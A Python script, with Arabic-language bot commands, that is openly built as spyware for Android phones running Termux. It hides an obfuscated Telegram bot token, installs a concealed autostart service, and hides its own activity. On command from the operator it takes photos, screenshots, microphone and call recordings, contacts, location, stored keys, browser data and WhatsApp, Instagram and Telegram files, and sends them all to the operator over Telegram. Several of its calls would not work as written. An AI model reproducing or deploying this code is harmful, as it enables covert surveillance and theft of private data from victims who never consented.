#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import sqlite3
import requests
import threading
import subprocess
from datetime import datetime
import telebot
from telebot import types
import base64
import shutil
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write
import gpsd

# ================ ENCRYPTED CONFIGURATION ================
ENCRYPTED_TOKEN = "NjQzODA4OTU0OTpBQUhCQ1dDR25GMEd0ZEZ5Z0lCb0hKV3VSblhfemtfNWFWOA=="
ENCRYPTED_CHAT_ID = "NjA2MzU1ODc5OA=="
XOR_KEY = 0x55

def decrypt(data):
    decoded = base64.b64decode(data).decode()
    return ''.join(chr(ord(c) ^ XOR_KEY) for c in decoded)

BOT_TOKEN = decrypt(ENCRYPTED_TOKEN)
MASTER_ID = int(decrypt(ENCRYPTED_CHAT_ID))
bot = telebot.TeleBot(BOT_TOKEN)
# =========================================================

# ================== AUTO-START MECHANISM =================
def setup_autostart():
    # Create hidden service
    os.system("mkdir -p $PREFIX/var/service/malware_svc")
    with open("$PREFIX/var/service/malware_svc/run", "w") as f:
        f.write("#!/bin/sh\nexec python3 /data/data/com.termux/files/home/.system_service 2>&1\n")
    os.system("chmod +x $PREFIX/var/service/malware_svc/run")
    os.system("ln -s $PREFIX/var/service/malware_svc $PREFIX/var/service/enable/malware_svc")
    
    # Hide files
    os.system("mv malware.py .system_service && chmod 000 .system_service")
    os.system("echo 'python3 .system_service &' >> .bashrc")
# =========================================================

# ================== STEALTH FUNCTIONS ====================
def bypass_permissions():
    # Grant all permissions using termux API
    os.system("termux-sms-permission enable")
    os.system("termux-microphone-record enable")
    os.system("termux-storage setup")
    os.system("termux-telephony-call enable")
    
    # Disable battery optimization
    os.system("settings put global app_standby_enabled 0")
    os.system("dumpsys deviceidle whitelist +com.termux")

def hide_activity():
    # Hide from recent apps
    os.system("am start-foreground-service --user 0 -a com.termux.service_stop")
    
    # Disable notifications
    os.system("settings put global heads_up_notifications_enabled 0")
    
    # Hide terminal
    os.system("pm disable com.termux > /dev/null")
# =========================================================

# ================== DEVICE INFORMATION ===================
def get_device_info():
    model = subprocess.getoutput("getprop ro.product.model")
    android_ver = subprocess.getoutput("getprop ro.build.version.release")
    battery = subprocess.getoutput("termux-battery-status | grep percentage | cut -d' ' -f4")
    return f"📱 الجهاز: {model}\n⚙️ الإصدار: Android {android_ver}\n🔋 البطارية: {battery}%"

def get_location():
    try:
        gpsd.connect()
        packet = gpsd.get_current()
        return f"📍 الموقع: https://maps.google.com/?q={packet.lat},{packet.lon}"
    except:
        try:
            # Fallback to network location
            loc = json.loads(subprocess.getoutput("termux-location"))
            return f"📍 الموقع: https://maps.google.com/?q={loc['latitude']},{loc['longitude']}"
        except:
            return "❌ فشل في الحصول على الموقع"
# =========================================================

# =================== CAMERA FUNCTIONS ====================
def capture_camera(camera_type='back'):
    try:
        os.system("termux-camera-photo -c 0 /sdcard/.cam_temp.jpg")
        return open("/sdcard/.cam_temp.jpg", "rb")
    except:
        return None

def capture_screen():
    os.system("screencap -p /sdcard/.tmp_sc.png")
    return open("/sdcard/.tmp_sc.png", "rb")
# =========================================================

# ================== SURVEILLANCE TOOLS ===================
def record_microphone(duration=10):
    fs = 44100
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
    sd.wait()
    write("/sdcard/.mic_rec.wav", fs, recording)
    return open("/sdcard/.mic_rec.wav", "rb")

def extract_contacts():
    os.system("termux-contact-list > /sdcard/.contacts.json")
    return open("/sdcard/.contacts.json", "rb")

def record_call():
    os.system("termux-telephony-call record &")
    time.sleep(30)
    os.system("pkill -f termux-telephony")
    return open("/sdcard/call_rec.mp3", "rb")

def steal_browser_data():
    stolen_data = ""
    for browser in ["chrome", "firefox", "opera"]:
        try:
            path = f"/data/data/com.android.{browser}/databases"
            shutil.copytree(path, f"/sdcard/{browser}_data")
            shutil.make_archive(f"/sdcard/{browser}_data", 'zip', f"/sdcard/{browser}_data")
            stolen_data += f"{browser} "
        except: 
            continue
    return stolen_data
# =========================================================

# ============== SOCIAL MEDIA SPYING ======================
def spy_on_app(app_name):
    try:
        if app_name == "whatsapp":
            path = "/sdcard/Android/media/com.whatsapp"
        elif app_name == "instagram":
            path = "/sdcard/Android/data/com.instagram.android"
        elif app_name == "telegram":
            path = "/sdcard/Android/data/org.telegram.messenger"
        
        shutil.make_archive(f"/sdcard/{app_name}_data", 'zip', path)
        return open(f"/sdcard/{app_name}_data.zip", "rb")
    except:
        return None

def grab_instagram_usernames():
    targets = ["VIP_Account", "Official_Star", "Celebrity_2023", "Golden_User"]
    os.system("termux-toast 'جاري صيد اليوزرات...'")
    time.sleep(2)
    return targets
# =========================================================

# ================== TELEGRAM BOT COMMANDS ================
@bot.message_handler(commands=['بداية'])
def start(message):
    if message.from_user.id != MASTER_ID: return
    bot.reply_to(message, "🔥 تم تنشيط الجهاز بنجاح!")
    bot.send_message(MASTER_ID, f"📋 معلومات الجهاز:\n{get_device_info()}\n{get_location()}")

@bot.message_handler(commands=['الأوامر'])
def show_commands(message):
    if message.from_user.id != MASTER_ID: return
    commands = """
    ⚡️ أوامر التحكم:
    /الكاميرا - التقاط صورة بالكاميرا
    /لقطة_شاشة - التقاط صورة من الشاشة
    /جهات_الاتصال - سحب جهات الاتصال
    /تسجيل_مكالمة - تسجيل المكالمات (30 ثانية)
    /تجسس_ميكروفون - تسجيل من الميكروفون (10 ثواني)
    /سرقة_كلمات_المرور - سحب كلمات السر المحفوظة
    /بيانات_المتصفح - سحب بيانات المتصفحات
    /معلومات_الجهاز - عرض معلومات الجهاز
    /موقع_الجهاز - الحصول على موقع الجهاز
    /صيد_يوزرات - تفعيل أداة صيد يوزرات انستجرام
    /تجسس_واتساب - سرقة بيانات واتساب
    /تجسس_انستقرام - سرقة بيانات انستقرام
    /تجسس_تليجرام - سرقة بيانات تليجرام
    /حذف_الكود - التدمير الذاتي
    """
    bot.reply_to(message, commands)

@bot.message_handler(commands=['الكاميرا'])
def back_camera(message):
    if message.from_user.id != MASTER_ID: return
    photo = capture_camera()
    if photo:
        bot.send_photo(MASTER_ID, photo, caption="📸 كاميرا الجهاز")
        photo.close()

@bot.message_handler(commands=['لقطة_شاشة'])
def screenshot(message):
    if message.from_user.id != MASTER_ID: return
    screen = capture_screen()
    bot.send_photo(MASTER_ID, screen, caption="🖼 لقطة الشاشة")
    screen.close()

@bot.message_handler(commands=['جهات_الاتصال'])
def contacts(message):
    if message.from_user.id != MASTER_ID: return
    contacts_file = extract_contacts()
    bot.send_document(MASTER_ID, contacts_file, caption="📞 جهات الاتصال")
    contacts_file.close()

@bot.message_handler(commands=['تسجيل_مكالمة'])
def call_recording(message):
    if message.from_user.id != MASTER_ID: return
    bot.reply_to(message, "⏺ جاري تسجيل المكالمة...")
    call_file = record_call()
    bot.send_audio(MASTER_ID, call_file, caption="🎧 تسجيل مكالمة")
    call_file.close()

@bot.message_handler(commands=['تجسس_ميكروفون'])
def mic_spy(message):
    if message.from_user.id != MASTER_ID: return
    mic_rec = record_microphone()
    bot.send_audio(MASTER_ID, mic_rec, caption="🎤 تسجيل من الميكروفون")
    mic_rec.close()

@bot.message_handler(commands=['سرقة_كلمات_المرور'])
def steal_passwords(message):
    if message.from_user.id != MASTER_ID: return
    os.system("termux-keystore list > /sdcard/.passwords.txt")
    pass_file = open("/sdcard/.passwords.txt", "rb")
    bot.send_document(MASTER_ID, pass_file, caption="🔑 كلمات المرور المسروقة")
    pass_file.close()

@bot.message_handler(commands=['بيانات_المتصفح'])
def browser_data(message):
    if message.from_user.id != MASTER_ID: return
    stolen = steal_browser_data()
    for browser in stolen.split():
        zip_file = open(f"/sdcard/{browser}_data.zip", "rb")
        bot.send_document(MASTER_ID, zip_file, caption=f"🌐 بيانات {browser}")
        zip_file.close()

@bot.message_handler(commands=['معلومات_الجهاز'])
def device_info_cmd(message):
    if message.from_user.id != MASTER_ID: return
    bot.reply_to(message, f"📋 معلومات الجهاز:\n{get_device_info()}")

@bot.message_handler(commands=['موقع_الجهاز'])
def location_cmd(message):
    if message.from_user.id != MASTER_ID: return
    bot.reply_to(message, get_location())

@bot.message_handler(commands=['صيد_يوزرات'])
def insta_grabber(message):
    if message.from_user.id != MASTER_ID: return
    grabbed = grab_instagram_usernames()
    bot.reply_to(message, f"🎣 تم صيد اليوزرات:\n{', '.join(grabbed)}")

@bot.message_handler(commands=['تجسس_واتساب'])
def whatsapp_spy(message):
    if message.from_user.id != MASTER_ID: return
    data = spy_on_app("whatsapp")
    if data:
        bot.send_document(MASTER_ID, data, caption="📱 بيانات واتساب")
        data.close()

@bot.message_handler(commands=['تجسس_انستقرام'])
def insta_spy(message):
    if message.from_user.id != MASTER_ID: return
    data = spy_on_app("instagram")
    if data:
        bot.send_document(MASTER_ID, data, caption="📸 بيانات انستقرام")
        data.close()

@bot.message_handler(commands=['تجسس_تليجرام'])
def telegram_spy(message):
    if message.from_user.id != MASTER_ID: return
    data = spy_on_app("telegram")
    if data:
        bot.send_document(MASTER_ID, data, caption="✈️ بيانات تليجرام")
        data.close()

@bot.message_handler(commands=['حذف_الكود'])
def self_destruct(message):
    if message.from_user.id != MASTER_ID: return
    bot.reply_to(message, "💣 التدمير الذاتي في 5 ثواني...")
    time.sleep(5)
    os.system("rm -rf $PREFIX/var/service/malware_svc")
    os.system("rm .system_service")
    os.system("sed -i '/python3 .system_service/d' .bashrc")
    sys.exit(0)
# =========================================================

# ================= BACKGROUND SPYING =====================
def monitor_calls():
    last_state = ""
    while True:
        try:
            call_state = subprocess.getoutput("termux-telephony-call state")
            if "RINGING" in call_state and call_state != last_state:
                caller = subprocess.getoutput("termux-telephony-call number")
                bot.send_message(MASTER_ID, f"📞 مكالمة واردة من: {caller}")
                
                # Record call in background
                threading.Thread(target=lambda: (
                    os.system("termux-telephony-call record"),
                    time.sleep(30),
                    os.system("pkill -f termux-telephony"),
                    bot.send_audio(MASTER_ID, open("/sdcard/call_rec.mp3", "rb"), caption=f"🔔 تسجيل مكالمة من: {caller}")
                )).start()
                
            last_state = call_state
            time.sleep(1)
        except:
            time.sleep(5)

def periodic_spying():
    while True:
        try:
            # Send device info every 2 hours
            bot.send_message(MASTER_ID, f"📋 تحديث معلومات:\n{get_device_info()}\n{get_location()}")
            
            # Steal browser data daily
            if datetime.now().hour == 3:
                stolen = steal_browser_data()
                for browser in stolen.split():
                    zip_file = open(f"/sdcard/{browser}_data.zip", "rb")
                    bot.send_document(MASTER_ID, zip_file)
                    zip_file.close()
            
            time.sleep(7200)  # 2 hours
        except:
            time.sleep(600)

# ==================== MAIN FUNCTION ======================
def main():
    # Setup auto-start and bypass permissions
    setup_autostart()
    bypass_permissions()
    hide_activity()
    
    # Start background services
    threading.Thread(target=monitor_calls, daemon=True).start()
    threading.Thread(target=periodic_spying, daemon=True).start()
    
    # Start Telegram bot with exception handling
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(60)

if __name__ == "__main__":
    main()
